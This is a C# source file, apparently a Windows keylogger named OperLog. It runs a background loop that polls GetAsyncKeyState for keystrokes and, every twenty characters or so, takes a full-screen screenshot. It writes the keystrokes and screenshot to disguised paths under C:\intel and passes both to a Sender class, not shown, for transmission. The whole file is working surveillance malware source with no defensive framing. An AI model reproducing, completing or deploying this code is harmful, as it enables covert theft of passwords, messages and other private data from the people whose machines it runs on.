using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace OperLog
{
    class Log
    {
        public static int Nsymb = 20;
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        //[STAThread]
        BackgroundWorker _bw;
        public void Main() {
            this._bw = new BackgroundWorker();
            this._bw.DoWork += Key_Log;
            this._bw.RunWorkerAsync();
        }
        const string Picpath = @"C:\intel\icon.png";
        const string Logpath = @"C:\intel\log.log";
        public void Key_Log(object sender, DoWorkEventArgs e)
        { 
            string buf = "";
           while (true) {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++) 
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += GetKyesId((Keys)i);
                        if (buf.Length > Nsymb) {
                            // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
                            MakeLog(Picpath,Logpath,buf);
                            buf = "";
                        }
                    }
                }
           }
        }
        static void Snap(string path) {
            try {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmp.Save(path, ImageFormat.Png);
            }
            catch (Exception) {
                // Application.Restart(); 
            }
        }

       static void AddText(string text, string path)
        {
            File.AppendAllText(Logpath, text);
        }

       static void MakeLog(string picpath, string logpath, string text)
       {
           Snap(picpath);
           AddText(text,logpath);
           Sender m = new Sender();
           m.SendLog(text,picpath);
       }

       static string GetKyesId(Keys keyid)
       {
           string key = "";
           if (keyid == Keys.D0) { key = "0"; return key; }
           if (keyid == Keys.D1) { key = "1"; return key; }
           if (keyid == Keys.D2) { key = "2"; return key; }
           if (keyid == Keys.D3) { key = "3"; return key; }
           if (keyid == Keys.D4) { key = "4"; return key; }
           if (keyid == Keys.D5) { key = "5"; return key; }
           if (keyid == Keys.D6) { key = "6"; return key; }
           if (keyid == Keys.D7) { key = "7"; return key; }
           if (keyid == Keys.D8) { key = "8"; return key; }
           if (keyid == Keys.D9) { key = "9"; return key; }
           if (keyid == Keys.Space) { key = " "; return key; }
           if (keyid == Keys.Escape) { key = "ESC"; return key; }
           if (keyid == Keys.Back) { key = "<-"; return key; }
           if (keyid == Keys.Enter) { key = " NL"; return key; }
           if (keyid == Keys.Capital) { key = "CAPS"; return key; }
           if (keyid == Keys.Tab) { key = "TAB"; return key; }
           if (keyid == Keys.Right || keyid == Keys.Left || keyid == Keys.Down || keyid == Keys.Up) { key = ""; return key; }
           if (keyid == Keys.Menu || keyid == Keys.LMenu || keyid == Keys.RMenu) { key = "ALT"; return key; }
           if (keyid == Keys.Oemplus) { key = "+"; return key; }
           if (keyid == Keys.OemPeriod) { key = "."; return key; }
           if (keyid == Keys.OemMinus) { key = "-"; return key; }
           if (keyid == Keys.Oem5) { key = "/"; return key; }
           if (keyid == Keys.ShiftKey || keyid == Keys.LShiftKey || keyid == Keys.RShiftKey) { key = "SHIFT"; return key; }
           if (keyid == Keys.ControlKey || keyid == Keys.LControlKey || keyid == Keys.RControlKey) { key = "CTRL"; return key; }
           if (keyid == Keys.Oem1) { key = ";"; return key; }
           if (keyid == Keys.LButton || keyid == Keys.RButton || keyid == Keys.MButton) { key = ""; return key; }
           if (keyid.ToString().Length == 1)
           {
               key = keyid.ToString();
           }
           else
           {
               key = $"<{keyid.ToString()}>";
           }
           return key;
       }
    }
}
